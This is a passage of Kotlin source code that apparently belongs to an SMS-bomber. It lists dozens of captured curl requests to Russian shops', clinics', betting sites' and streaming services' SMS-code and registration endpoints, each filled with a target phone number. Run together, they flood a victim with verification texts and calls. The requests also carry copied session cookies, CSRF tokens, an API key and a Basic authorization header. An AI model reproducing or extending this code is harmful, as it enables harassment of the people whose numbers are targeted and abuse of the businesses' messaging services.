                          -H 'accept: application/json, text/javascript, */*; q=0.01' \
                          -H 'accept-language: ru,en;q=0.9,en-GB;q=0.8,en-US;q=0.7' \
                          -H 'content-type: application/x-www-form-urlencoded; charset=UTF-8' \
                          -H 'cookie: PHPSESSID=edfaddbc9139c97d8af81afd3cd16a1c; default=94b88df688d8db6df633dfce42814803; prmn_fias=4700; language=ru-ru; currency=RUB; sitecreator_hasWebP=1; _ga_8ND8TB3BYH=GS1.1.1689623016.1.0.1689623016.60.0.0; _ga=GA1.2.1676326641.1689623016; _gid=GA1.2.821168971.1689623016; _gat_gtag_UA_196378717_1=1; _gat_UA-196378717-1=1; roistat_visit=902665; roistat_first_visit=902665; roistat_visit_cookie_expire=1209600; roistat_is_need_listen_requests=0; roistat_is_save_data_in_cookie=1; prmn_confirm=1; roistat_cookies_to_resave=roistat_ab%2Croistat_ab_submit%2Croistat_visit; _hjSessionUser_2693180=eyJpZCI6ImRkYmUzM2E1LTVkODQtNTYwMS05YzFmLWQ3NWQ4MTM2M2MxMyIsImNyZWF0ZWQiOjE2ODk2MjMwMTY2MzksImV4aXN0aW5nIjpmYWxzZX0=; _hjFirstSeen=1; _hjIncludedInSessionSample_2693180=0; _hjSession_2693180=eyJpZCI6Ijg2NzBlYTMyLWRmYzItNDI5OS05MmVkLWZkOWE5ZDE4OGQyZiIsImNyZWF0ZWQiOjE2ODk2MjMwMTY2NDcsImluU2FtcGxlIjpmYWxzZX0=; _hjAbsoluteSessionInProgress=0; ___dc=c1d2a49f-10c1-4c9b-b99f-f1166b9ba0e5; _ym_uid=1689623019351468204; _ym_d=1689623019; _ym_isad=2; tmr_lvid=c80c9fdf8a2ef0f00341556eb08b459a; tmr_lvidTS=1689623020046; tmr_detect=0%7C1689623022539' \
                          -H 'origin: https://khesflowers.ru' \
                          -H 'referer: https://khesflowers.ru/' \
                          -H 'sec-ch-ua: "Google Chrome";v="108", "Chromium";v="108", "Not=A?Brand";v="24"' \
                          -H 'sec-ch-ua-mobile: ?0' \
                          -H 'sec-ch-ua-platform: "Windows"' \
                          -H 'sec-fetch-dest: empty' \
                          -H 'sec-fetch-mode: cors' \
                          -H 'sec-fetch-site: same-origin' \
                          -H 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36' \
                          -H 'x-requested-with: XMLHttpRequest' \
                          --data-raw 'user_validation_83963=1&phone=%2B{phone:7+(***)+***-**-**}' \
                          --compressed
                          """.trimIndent(), 7
    ),

    CurlService(
        """
                        curl 'https://pass.ska.ru/registration/send-cod/' \
                          -H 'authority: pass.ska.ru' \
                          -H 'accept: application/json, text/javascript, */*; q=0.01' \
                          -H 'accept-language: ru,en;q=0.9,en-GB;q=0.8,en-US;q=0.7' \
                          -H 'content-type: application/x-www-form-urlencoded; charset=UTF-8' \
                          -H 'cookie: _ym_uid=1683473292741918790; _ym_d=1683473292; PHPSESSID=62617b87391e9b23cfb9837de0d4895a; _ym_isad=2; _ga_33Q6G79T6Y=GS1.1.1689623142.1.0.1689623142.60.0.0; _ym_visorc=w; _ga=GA1.2.361164651.1689623142; _gid=GA1.2.2090849296.1689623142; _gat_gtag_UA_19620142_22=1; _HC_4379=N@KONFI24pQlCk0Nzzzzzzzz:C4379G108:1692215141; _HC_uu=N@KONFI24pQlBk0Nzzzzzzzz; _HC_fr=:::1689623141; _HC_v4379=AmS1mmUAAQAA~N%40KONFI24pQlBk0N~N%40KONFI24pQlCk0Nzzzzzzzz~C4379G108' \
                          -H 'origin: https://pass.ska.ru' \
                          -H 'referer: https://pass.ska.ru/registration/' \
                          -H 'sec-ch-ua: "Google Chrome";v="108", "Chromium";v="108", "Not=A?Brand";v="24"' \
                          -H 'sec-ch-ua-mobile: ?0' \
                          -H 'sec-ch-ua-platform: "Windows"' \
                          -H 'sec-fetch-dest: empty' \
                          -H 'sec-fetch-mode: cors' \
                          -H 'sec-fetch-site: same-origin' \
                          -H 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36' \
                          -H 'x-csrf-token: l2_iflwWH7iMBLPGlihtwz1PlcK__52rEMN1Q4uoMgT9JLc9HntZyM9g64X0QASTCxXxiPbLr9h3jj0K3PdjNQ==' \
                          -H 'x-requested-with: XMLHttpRequest' \
                          --data-raw 'phone={phone}&phone_prefix=7&action=register' \
                          --compressed
                          """.trimIndent(), 7
    ),

    CurlService(
        """
                        curl 'https://mybile.secret-kitchen.ru/api/v1/sms/send_code' \
                          -H 'Accept: */*' \
                          -H 'Accept-Language: ru,en;q=0.9,en-GB;q=0.8,en-US;q=0.7' \
                          -H 'Business: sk' \
                          -H 'Connection: keep-alive' \
                          -H 'Content-Type: application/json' \
                          -H 'Deviceid: 7a3d7b19-eaa0-4c86-8904-3dac905ae075' \
                          -H 'Origin: https://secret-kitchen.ru' \
                          -H 'Platformid: site' \
                          -H 'Referer: https://secret-kitchen.ru/' \
                          -H 'Sec-Fetch-Dest: empty' \
                          -H 'Sec-Fetch-Mode: cors' \
                          -H 'Sec-Fetch-Site: same-site' \
                          -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36' \
                          -H 'sec-ch-ua: "Google Chrome";v="108", "Chromium";v="108", "Not=A?Brand";v="24"' \
                          -H 'sec-ch-ua-mobile: ?0' \
                          -H 'sec-ch-ua-platform: "Windows"' \
                          --data-raw '{"phone":"{phone}","type":"auth","apiKey":"8de2926e6d7aae30f45a2e54e27a7c1dc9ad586bda6df134a8a7c4aeb4eae41b"}' \
                          --compressed
                          """.trimIndent(), 7
    ),

    CurlService(
        """
                        curl 'https://parisnail.ru/ajax/mb_auth.php' \
                          -H 'authority: parisnail.ru' \
                          -H 'accept: */*' \
                          -H 'accept-language: ru,en;q=0.9,en-GB;q=0.8,en-US;q=0.7' \
                          -H 'content-type: application/x-www-form-urlencoded; charset=UTF-8' \
                          -H 'cookie: __ddg1_=w9o5DaqFbnStwTk8Z2mU; PHPSESSID=o9fk6ai5an7ab98el5k5agn4rf; tinkoff_auth_state=A71OYomReTPrqjuiNWp6; BQ_LOCATION[CODE]=0000314680; BQ_LOCATION[NAME]=%D0%9C%D1%83%D1%80%D0%BE%D0%BC; BQ_LOCATION[PHONE]=7+%28800%29+550-98-50; BQ_LOCATION[ZIP_CODE]=309257; BQ_LOCATION[CONTACT_ID]=0; BQ_LOCATION[PHONE_TEXT]=%D0%91%D0%B5%D1%81%D0%BF%D0%BB%D0%B0%D1%82%D0%BD%D0%BE+%D0%BF%D0%BE+%D0%A0%D0%BE%D1%81%D1%81%D0%B8%D0%B8; BQ_LOCATION[COUNTRY_ID]=104; BX_PERSONAL_ROOT_SALE_UID=9a5f7271f1107fbe7d00ec44bb319fdc; BITRIX_CONVERSION_CONTEXT_s1=%7B%22ID%22%3A2%2C%22EXPIRE%22%3A1689627540%2C%22UNIQUE%22%3A%5B%22conversion_visit_day%22%5D%7D; mindboxDeviceUUID=bb0643e8-bc08-4838-bf34-5b23a4221287; directCrm-session=%7B%22deviceGuid%22%3A%22bb0643e8-bc08-4838-bf34-5b23a4221287%22%7D; _gcl_au=1.1.438093537.1689623454; _ga_SBDLEELQSN=GS1.1.1689623453.1.0.1689623453.60.0.0; _ym_uid=1683470390650589872; _ym_d=1689623454; _userGUID=0:lk7a6gu2:xjX03~bWlvQuCjEhmd~dsSIz7_fSADu4; dSesn=6d089648-0277-bbef-47d6-533ca118fefb; _dvs=0:lk7a6gu2:tHX~_gaGyjofAaWrqXHqm3W1S9POYN4Z; _clck=14t1wtp|2|fdd|0|1293; BX_USER_ID=d7f672cdeaafc9313a532a213faa66f4; _ym_isad=2; _ga=GA1.2.1908481516.1689623454; _gid=GA1.2.1011983969.1689623454; _gat_gtag_UA_85201929_1=1; _ym_visorc=w; popmechanic_sbjs_migrations=popmechanic_1418474375998%3D1%7C%7C%7C1471519752600%3D1%7C%7C%7C1471519752605%3D1; _clsk=gzjjt|1689623454932|1|1|y.clarity.ms/collect' \
                          -H 'origin: https://parisnail.ru' \
                          -H 'referer: https://parisnail.ru/personal/?register=yes' \
                          -H 'sec-ch-ua: "Google Chrome";v="108", "Chromium";v="108", "Not=A?Brand";v="24"' \
                          -H 'sec-ch-ua-mobile: ?0' \
                          -H 'sec-ch-ua-platform: "Windows"' \
                          -H 'sec-fetch-dest: empty' \
                          -H 'sec-fetch-mode: cors' \
                          -H 'sec-fetch-site: same-origin' \
                          -H 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36' \
                          -H 'x-requested-with: XMLHttpRequest' \
                          --data-raw 'step=1&phone={full_phone}&code=&userRemember=N' \
                          --compressed
                          """.trimIndent(), 7
    ),

    CurlService(
        """
                        curl 'https://back.bh.market/api/front/user/sendSmsCode' \
                          -H 'authority: back.bh.market' \
                          -H 'accept: application/json, text/plain, */*' \
                          -H 'accept-language: ru,en;q=0.9,en-GB;q=0.8,en-US;q=0.7' \
                          -H 'content-type: application/json' \
                          -H 'origin: https://bh.market' \
                          -H 'referer: https://bh.market/' \
                          -H 'sec-ch-ua: "Google Chrome";v="108", "Chromium";v="108", "Not=A?Brand";v="24"' \
                          -H 'sec-ch-ua-mobile: ?0' \
                          -H 'sec-ch-ua-platform: "Windows"' \
                          -H 'sec-fetch-dest: empty' \
                          -H 'sec-fetch-mode: cors' \
                          -H 'sec-fetch-site: same-site' \
                          --data-raw '{"phone":"+{full_phone}"}' \
                          --compressed
                          """.trimIndent(), 7
    ),

    CurlService(
        """
                        curl 'https://gateway.smartmed.pro/personal/api/users/register/v2' \
                          -H 'authority: gateway.smartmed.pro' \
                          -H 'accept: application/json' \
                          -H 'accept-language: ru,en;q=0.9,en-GB;q=0.8,en-US;q=0.7' \
                          -H 'application-version: 2.2.0' \
                          -H 'content-type: application/json' \
                          -H 'currentdate: 2023-07-17T19:57:24Z' \
                          -H 'origin: https://online.smartmed.pro' \
                          -H 'pragma: no-cache' \
                          -H 'referer: https://online.smartmed.pro/' \
                          -H 'sec-ch-ua: "Google Chrome";v="108", "Chromium";v="108", "Not=A?Brand";v="24"' \
                          -H 'sec-ch-ua-mobile: ?0' \
                          -H 'sec-ch-ua-platform: "Windows"' \
                          -H 'sec-fetch-dest: empty' \
                          -H 'sec-fetch-mode: cors' \
                          -H 'sec-fetch-site: same-site' \
                          -H 'timezone-offset: 180' \
                          --data-raw '{"address":null,"birthday":"2000-07-13","email":null,"firstName":"ЕРкркекерк","gender":1,"lastName":"Пркереркр","password":"qwertyuiop","patientTypeForRegistration":1,"patronymic":"Керкеркер","phone":"{full_phone}","termsOfUse":[{"code":1,"value":true}],"withoutPatronymic":false}' \
                          --compressed
                          """.trimIndent()
    ),

    object : Service(7) {
        override fun run(
            client: OkHttpClient,
            callback: Callback,
            phone: Phone
        ) {
            client.newCall(
                Request.Builder()
                    .url("https://api.nuznyisport.ru/api/login/send-four-digit-code")
                    .post(
                        """
    ------WebKitFormBoundarytnqLgb8bRBkpig6F
    Content-Disposition: form-data; name="phone"
    
    $phone
    ------WebKitFormBoundarytnqLgb8bRBkpig6F--
    """.trimIndent().toRequestBody("multipart/form-data; boundary=----WebKitFormBoundarytnqLgb8bRBkpig6F".toMediaType())
                    )
                    .build()
            ).enqueue(callback)
        }
    },

    CurlService(
        """
                        curl 'https://api.sushifox.ru/web/auth/sendCode?client_device_type=web&uuid=t91TTy6o_wcOLmPc3oq7q' \
                          -H 'Accept: application/json, text/plain, */*' \
                          -H 'Accept-Language: ru,en;q=0.9,en-GB;q=0.8,en-US;q=0.7' \
                          -H 'Connection: keep-alive' \
                          -H 'Content-Type: application/json;charset=UTF-8' \
                          -H 'Origin: https://www.sushifox.ru' \
                          -H 'Referer: https://www.sushifox.ru/' \
                          -H 'Sec-Fetch-Dest: empty' \
                          -H 'Sec-Fetch-Mode: cors' \
                          -H 'Sec-Fetch-Site: same-site' \
                          -H 'sec-ch-ua: "Google Chrome";v="108", "Chromium";v="108", "Not=A?Brand";v="24"' \
                          -H 'sec-ch-ua-mobile: ?0' \
                          -H 'sec-ch-ua-platform: "Windows"' \
                          --data-raw '{"phone":"{full_phone}"}' \
                          --compressed
                          """.trimIndent(), 7
    ),

    CurlService(
        """
                        curl 'https://www.coolclever.ru/v4/site/user/auth/request-code/' \
                          -H 'authority: www.coolclever.ru' \
                          -H 'accept: application/json, text/plain, */*' \
                          -H 'accept-language: ru,en;q=0.9,en-GB;q=0.8,en-US;q=0.7' \
                          -H 'content-type: application/json' \
                          -H 'cookie: _ym_uid=1683460002853721667; _ym_d=1683460002; __ddg1_=bfe9XiMDbA2SS94rRxtZ; currentRegion=77; isAuth=false; token=3274b4b6-18df-49d5-9229-35783ddf988b; tmr_lvid=f2ef7c94235f9672cc567fbc5a593487; tmr_lvidTS=1683460002311; popmechanic_sbjs_migrations=popmechanic_1418474375998%3D1%7C%7C%7C1471519752600%3D1%7C%7C%7C1471519752605%3D1; _ym_isad=2; _ga=GA1.2.1591269336.1689624608; _gid=GA1.2.2031477131.1689624609; _gat_UA-209924958-1=1; adultStatus=1; _ym_visorc=w; mindboxDeviceUUID=bb0643e8-bc08-4838-bf34-5b23a4221287; directCrm-session=%7B%22deviceGuid%22%3A%22bb0643e8-bc08-4838-bf34-5b23a4221287%22%7D; tmr_detect=0%7C1689624611147; region=77; _ga_3G59J17G17=GS1.1.1689624607.1.0.1689624617.50.0.0' \
                          -H 'origin: https://www.coolclever.ru' \
                          -H 'referer: https://www.coolclever.ru/' \
                          -H 'sec-ch-ua: "Google Chrome";v="108", "Chromium";v="108", "Not=A?Brand";v="24"' \
                          -H 'sec-ch-ua-mobile: ?0' \
                          -H 'sec-ch-ua-platform: "Windows"' \
                          -H 'sec-fetch-dest: empty' \
                          -H 'sec-fetch-mode: cors' \
                          -H 'sec-fetch-site: same-origin' \
                          -H 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36' \
                          -H 'x-app-platform: web' \
                          --data-raw '{"phone":"{phone}","g-recaptcha-response":"03AAYGu2T6PnQn3umlFWIku6kbPm0BdWLBNGeVOnPnqKT5XZVMlk9njp92GvqEjd9E2ndv5VUEeV-HbHztkiNsfmLa1xWzDYOkI5CUeq3RsdjIAvke_lnvRfAADsokPw4GO-t-0X2ZSsevRvqechami5n6mA45ZhynzyoUSeux0EjtLJqq60JKg9ajxddIinKF0RcGJuQOoQ7yPaBnzDHX0BnLfrLATjR0409ta2ahNK8PMmrDe13BjuomDW-Zp2SMklBSi776oi1FnNj_NM2apkfr8CB45tQjflYh4PyVcm4uFc9zmKntaRqYzacAv-CbdpCQGXD7eGaiBxLUuhYq8c1g2wUlvXKvN7qzci7kmd_TBodOjEiRv4VBt9O8NvMXarVVRZTKiuyFQbHympTA-o9CPjox-XIexqVdiFIAwwRJhMZvLhwfGUprH4Q07Y8h_1cEr5IgUJxoc9yABcGZWs3SKiabShLcVIEmhiCjdKm8n20y6Zqo0E5VQisLbdXqsuUvE92JCL01BaS2w3uf_sa_q88i-JLxHGk9SH5VRAKxF9T7qSkte5I","authMethod":"call"}' \
                          --compressed
                          """.trimIndent(), 7
    ),

    CurlService(
        """
                        curl 'https://clientsapi03.pb06e2-resources.com/cps/superRegistration/createProcess' \
                          -H 'Accept: */*' \
                          -H 'Accept-Language: ru,en;q=0.9,en-GB;q=0.8,en-US;q=0.7' \
                          -H 'Connection: keep-alive' \
                          -H 'Content-Type: text/plain;charset=UTF-8' \
                          -H 'Origin: https://www.pari.ru' \
                          -H 'Referer: https://www.pari.ru/content/registrationFrame.html?webview=true&type=registration&lang=ru&deviceId=E6F4B6A9491A13FFF74515E9EFF72ABE&sysId=2&platform=mobile_web&analyticsId=5836595265017988318&theme=pb_default&appVersion=3.116.1' \
                          -H 'Sec-Fetch-Dest: empty' \
                          -H 'Sec-Fetch-Mode: cors' \
                          -H 'Sec-Fetch-Site: cross-site' \
                          -H 'sec-ch-ua: "Google Chrome";v="108", "Chromium";v="108", "Not=A?Brand";v="24"' \
                          -H 'sec-ch-ua-mobile: ?0' \
                          -H 'sec-ch-ua-platform: "Windows"' \
                          --data-raw '{"fio":"","password":"qwertyuiop123_","email":"","emailAdvertAccepted":true,"phoneNumber":"+{full_phone}","webReferrer":"https://www.pari.ru/mobile/registration/start/","advertInfo":"","platformInfo":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36","promoId":"","ecupis":true,"birthday":"2001-01-01","sysId":2,"lang":"ru","appVersion":"1.4.0","deviceId":"E6F4B6A9491A13FFF74515E9EFF72ABE"}' \
                          --compressed
                          """.trimIndent(), 7
    ),

    CurlService(
        """
                        curl 'https://www.xn--e1agpbetw.xn--p1ai/clientSignup' \
                          -H 'Accept: */*' \
                          -H 'Accept-Language: ru,en;q=0.9,en-GB;q=0.8,en-US;q=0.7' \
                          -H 'Connection: keep-alive' \
                          -H 'Content-Type: application/x-www-form-urlencoded; charset=UTF-8' \
                          -H 'Cookie: PHPSESSID=0e1976630dcd18ff73b70122f87ab737; _csrf=400c66a45fc86334c0cf953163cfc5be4aee6406956e34534fe503c605c00013a%3A2%3A%7Bi%3A0%3Bs%3A5%3A%22_csrf%22%3Bi%3A1%3Bs%3A32%3A%22QVscXt4Y3wrEoOEHTNNWhMlfMHwiu7iD%22%3B%7D; __session:0.20956442189629487:=https:; tmr_lvid=0123e87a3eef3eb57c70885594bb5810; tmr_lvidTS=1689625212520; _ym_uid=1689625213932765387; _ym_d=1689625213; _ym_isad=2; _ym_visorc=w; tmr_detect=0%7C1689625214824' \
                          -H 'Origin: https://www.xn--e1agpbetw.xn--p1ai' \
                          -H 'Referer: https://www.xn--e1agpbetw.xn--p1ai/clientLogin' \
                          -H 'Sec-Fetch-Dest: empty' \
                          -H 'Sec-Fetch-Mode: cors' \
                          -H 'Sec-Fetch-Site: same-origin' \
                          -H 'X-CSRF-Token: OEUzaWNySkxpE0AKOwZ.FQsyQSwMPQ8EbAt9Pgs/Jip1DUQAFkUjCA==' \
                          -H 'X-Requested-With: XMLHttpRequest' \
                          -H 'sec-ch-ua: "Google Chrome";v="108", "Chromium";v="108", "Not=A?Brand";v="24"' \
                          -H 'sec-ch-ua-mobile: ?0' \
                          -H 'sec-ch-ua-platform: "Windows"' \
                          --data-raw '_csrf=OEUzaWNySkxpE0AKOwZ.FQsyQSwMPQ8EbAt9Pgs%2FJip1DUQAFkUjCA%3D%3D&ClientLoginForm%5Bphone%5D=%2B7+{phone:***+***-**-**}&ClientLoginForm%5Bpassword%5D=gergergergerger&ClientLoginForm%5BrememberMe%5D=0&ClientLoginForm%5BrememberMe%5D=1&type=whatsapp' \
                          --compressed
                          """.trimIndent(), 7
    ),

    CurlService(
        """
                        curl 'https://cnt-vlmr-itv02.svc.iptv.rt.ru/api/v2/portal/send_sms_code' \
                          -H 'authority: cnt-vlmr-itv02.svc.iptv.rt.ru' \
                          -H 'accept: application/json, text/plain, */*' \
                          -H 'accept-language: ru,en;q=0.9,en-GB;q=0.8,en-US;q=0.7' \
                          -H 'content-type: application/json' \
                          -H 'origin: https://wink.ru' \
                          -H 'referer: https://wink.ru/' \
                          -H 'sec-ch-ua: "Google Chrome";v="108", "Chromium";v="108", "Not=A?Brand";v="24"' \
                          -H 'sec-ch-ua-mobile: ?0' \
                          -H 'sec-ch-ua-platform: "Windows"' \
                          -H 'sec-fetch-dest: empty' \
                          -H 'sec-fetch-mode: cors' \
                          -H 'sec-fetch-site: cross-site' \
                          -H 'session_id: e34bc78f-24df-11ee-8e4b-4857027601a0:1951416:2237006:2' \
                          -H 'x-wink-version: v2023.07.17.1651' \
                          --data-raw '{"phone":"{full_phone}","action":"register"}' \
                          --compressed
                          """.trimIndent(), 7
    ),

    CurlService(
        """
                        curl 'https://clientsapi51w.bk6bba-resources.com/cps/superRegistration/createProcess' \
                          -H 'Accept: */*' \
                          -H 'Accept-Language: ru,en;q=0.9,en-GB;q=0.8,en-US;q=0.7' \
                          -H 'Connection: keep-alive' \
                          -H 'Content-Type: text/plain;charset=UTF-8' \
                          -H 'Origin: https://www.fon.bet' \
                          -H 'Referer: https://www.fon.bet/content/registrationFrame.html?webview=true&type=registration&lang=ru&deviceId=18EAC184CFA3CDB7F89C4D8D6C0A2A3A&sysId=2&platform=mobile_web&analyticsId=3801994895077200830&theme=light&appVersion=3.116.0' \
                          -H 'Sec-Fetch-Dest: empty' \
                          -H 'Sec-Fetch-Mode: cors' \
                          -H 'Sec-Fetch-Site: cross-site' \
                          -H 'sec-ch-ua: "Google Chrome";v="108", "Chromium";v="108", "Not=A?Brand";v="24"' \
                          -H 'sec-ch-ua-mobile: ?0' \
                          -H 'sec-ch-ua-platform: "Windows"' \
                          --data-raw '{"fio":"","password":"Kiz624_9S\u0021sLyQe","email":"","emailAdvertAccepted":true,"phoneNumber":"+{full_phone}","webReferrer":"https://www.fon.bet/mobile/?utm_referrer=https%3A%2F%2Fyandex.ru%2F","advertInfo":"","platformInfo":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36","promoId":"","ecupis":true,"birthday":"2001-01-01","sysId":2,"lang":"ru","appVersion":"1.4.0","deviceId":"18EAC184CFA3CDB7F89C4D8D6C0A2A3A"}' \
                          --compressed
                          """.trimIndent(), 7
    ),

    CurlService(
        """
                        curl 'https://my-shop.ru/cgi-bin/my_util2.pl?q=my_code_for_phone_confirmation&view_id=cad78c6d-6e8b-4443-abe9-f89658b37fe933a0b9054' \
                          -H 'authority: my-shop.ru' \
                          -H 'accept: application/json, text/plain, */*' \
                          -H 'accept-language: ru,en;q=0.9,en-GB;q=0.8,en-US;q=0.7' \
                          -H 'authorization: Basic YmV0YXVzZXI6MFp2aVhlQW9HV0JNSmMxM0luYzE=' \
                          -H 'content-type: application/json;charset=UTF-8' \
                          -H 'cookie: uid=Cn8BFWS1pKkw/xhVi+JQAg==; sessionId=16896257731257771169; mindboxDeviceUUID=bb0643e8-bc08-4838-bf34-5b23a4221287; directCrm-session=%7B%22deviceGuid%22%3A%22bb0643e8-bc08-4838-bf34-5b23a4221287%22%7D; _ga_J4L4FRCV76=GS1.1.1689625773.1.0.1689625773.60.0.0; tmr_lvid=3cb8a7cc3a81f281d0b3e01a43fd2fe3; tmr_lvidTS=1666886269304; _ga=GA1.2.2117831355.1689625773; _gid=GA1.2.2052941486.1689625773; _dc_gtm_UA-22340172-1=1; _ym_uid=1659887748410412768; _ym_d=1689625774; _ym_isad=2; _ym_visorc=w; adrdel=1; adrcid=AyWeQMx8O1DF95dsGKTDIsQ; tmr_detect=0%7C1689625775832' \
                          -H 'origin: https://my-shop.ru' \
                          -H 'referer: https://my-shop.ru/' \
                          -H 'sec-ch-ua: "Google Chrome";v="108", "Chromium";v="108", "Not=A?Brand";v="24"' \
                          -H 'sec-ch-ua-mobile: ?0' \
                          -H 'sec-ch-ua-platform: "Windows"' \
                          -H 'sec-fetch-dest: empty' \
                          -H 'sec-fetch-mode: cors' \
                          -H 'sec-fetch-site: same-origin' \
                          --data-raw '{"phone_code":"7","phone":"{phone}"}' \
                          --compressed
                          """.trimIndent(), 7
    ),

    CurlService(
        """
                        curl 'https://liniilubvi.ru/personal/profile/' \
                          -H 'authority: liniilubvi.ru' \
                          -H 'accept: */*' \
                          -H 'accept-language: ru,en;q=0.9,en-GB;q=0.8,en-US;q=0.7' \
                          -H 'content-type: application/x-www-form-urlencoded; charset=UTF-8' \
                          -H 'cookie: __ddg1_=lsYhhTFvJnHY3859k5k9; experimentVariantId_ll8=11; PHPSESSID=4fc044ln5mj534skhbdmuqfsme; subscribe-popup=cookiesubscribe; _gid=GA1.2.542052269.1689625960; _ga_cid=760644780.1689625960; _gat=1; rrpvid=310761005772141; _ym_uid=1648576022483904673; _ym_d=1689625960; mindboxDeviceUUID=bb0643e8-bc08-4838-bf34-5b23a4221287; directCrm-session=%7B%22deviceGuid%22%3A%22bb0643e8-bc08-4838-bf34-5b23a4221287%22%7D; _userGUID=0:lk7bo6wm:01syzn4RzCaxgsLsmwcxHR6TZDsuNt_c; _ym_isad=2; BX_USER_ID=d7f672cdeaafc9313a532a213faa66f4; rcuid=6275fcd65368be000135cd22; tmr_lvid=6e70a0a92ed7c32b08ffe1ce00fc57ba; tmr_lvidTS=1689625960650; __utma=117815316.760644780.1689625960.1689625961.1689625961.1; __utmc=117815316; __utmz=117815316.1689625961.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none); __utmt_UA-32426418-13=1; popmechanic_sbjs_migrations=popmechanic_1418474375998%3D1%7C%7C%7C1471519752600%3D1%7C%7C%7C1471519752605%3D1; __utmb=117815316.2.10.1689625961; _ga=GA1.1.760644780.1689625960; _ga_Q2GKTC7MRN=GS1.1.1689625960.1.1.1689625964.0.0.0; tmr_detect=0%7C1689625964792' \
                          -H 'origin: https://liniilubvi.ru' \
                          -H 'referer: https://liniilubvi.ru/personal/profile/' \
                          -H 'sec-ch-ua: "Google Chrome";v="108", "Chromium";v="108", "Not=A?Brand";v="24"' \
                          -H 'sec-ch-ua-mobile: ?0' \
                          -H 'sec-ch-ua-platform: "Windows"' \
                          -H 'sec-fetch-dest: empty' \
                          -H 'sec-fetch-mode: cors' \
                          -H 'sec-fetch-site: same-origin' \
                          -H 'x-requested-with: XMLHttpRequest' \
                          --data-raw 'state=1&phone={full_phone}' \
                          --compressed
                          """.trimIndent(), 7
    ),

    object : Service(7) {
        override fun run(
            client: OkHttpClient,
            callback: Callback,
            phone: Phone
        ) {
            CurlService(
                """curl 'https://www.clinic23.ru/api/' \
  -H 'authority: www.clinic23.ru' \
  -H 'accept: */*' \
  -H 'accept-language: ru,en;q=0.9,en-GB;q=0.8,en-US;q=0.7' \
  -H 'content-type: application/x-www-form-urlencoded; charset=UTF-8' \
  -H 'cookie: PHPSESSID=c6d533e90ef751710b851d5c740f6b23; tmr_lvid=8f5515ca9a25fe90e176f7781cdea56b; tmr_lvidTS=1689626111677; cted=modId%3D67q5wngs%3Bclient_id%3D22258626.1689626112; _ym_uid=1689626112835738540; _ym_d=1689626112; _gid=GA1.2.126313026.1689626112; _dc_gtm_UA-112612622-1=1; _ym_isad=2; _ym_visorc=w; _ga_1F4Z28J2QS=GS1.1.1689626111.1.1.1689626113.58.0.0; _ga=GA1.2.22258626.1689626112; tmr_detect=0%7C1689626116366' \
  -H 'origin: https://www.clinic23.ru' \
  -H 'referer: https://www.clinic23.ru/lichnyi-kabinet' \
  -H 'sec-ch-ua: "Google Chrome";v="108", "Chromium";v="108", "Not=A?Brand";v="24"' \
  -H 'sec-ch-ua-mobile: ?0' \
  -H 'sec-ch-ua-platform: "Windows"' \
  -H 'sec-fetch-dest: empty' \
  -H 'sec-fetch-mode: cors' \
  -H 'sec-fetch-site: same-origin' \
  -H 'x-requested-with: XMLHttpRequest' \
  --data-raw 'method=lk%3Aauth&form%5Bphone%5D=%2B7+{phone:(***)+***-**-**}&form%5Brand%5D=${Random().nextInt(54323)}&qt=' \
  --compressed"""
            ).run(client, callback, phone)
        }
    },
    CurlService(
        """
                        curl 'https://imkosmetik.com/api-site/ajax/auth/ident-by-phone/' \
                          -H 'authority: imkosmetik.com' \
                          -H 'accept: application/json' \
                          -H 'accept-language: ru,en;q=0.9,en-GB;q=0.8,en-US;q=0.7' \
                          -H 'content-type: application/x-www-form-urlencoded' \
                          -H 'cookie: PHPSESSID=869b3faf4f38464f62cc718f900c888c; _csrf=762c90aea0fdd3437c10433f980bba799b80645824da3999d3c90fae0ee6bdbea%3A2%3A%7Bi%3A0%3Bs%3A5%3A%22_csrf%22%3Bi%3A1%3Bs%3A32%3A%2226uzoLtN3Et-ifCp5VR-hVvX__g8GGR5%22%3B%7D; rrpvid=444597250764043; tmr_lvid=789aa2bd5838f170e95206e8b97bba17; tmr_lvidTS=1689626347345; _ym_uid=1689626347269362291; _ym_d=1689626347; _gcl_au=1.1.2043127203.1689626348; _ym_isad=2; g4c_x=1; _ga_5BM073MHWB=GS1.1.1689626347.1.0.1689626347.60.0.0; _ga_52V9VXP3L4=GS1.1.1689626347.1.0.1689626347.0.0.0; _ga=GA1.2.1701739037.1689626348; _gid=GA1.2.265741333.1689626348; _gat_UA-226019876-1=1; _dc_gtm_UA-49352807-1=1; popmechanic_sbjs_migrations=popmechanic_1418474375998%3D1%7C%7C%7C1471519752600%3D1%7C%7C%7C1471519752605%3D1; rcuid=6275fcd65368be000135cd22; _userGUID=0:lk7bwhze:Sidu1dOCmbKJPPzkq7FWjCil32woty6i; dSesn=2df5b1d5-e048-cb08-28a9-89620c0fce47; _dvs=0:lk7bwhze:Vv6rVQflPtsaTt0rJzl9ZcYYZ8gZ_J6u; cto_bundle=6rkTfF9aZGJadEt5VVR4VjBaQ1VaMTVDVFY1SW5UMndIRU9jQnVXdyUyRnJRWDljU0p0ZVVESFJPdlYlMkZkRWllRk1ETFEwdDBOVmk3Nnc0czUyJTJCMnljMHd0UlVSZmlqMmpnTkZWN2VJQ01BaEpKd3BmU01kUENpVHRjVXlRbmpGdzcwZ0JDVA; _ga_XDWXGNYGD9=GS1.2.1689626348.1.0.1689626348.0.0.0; _ym_visorc=w; mindboxDeviceUUID=bb0643e8-bc08-4838-bf34-5b23a4221287; 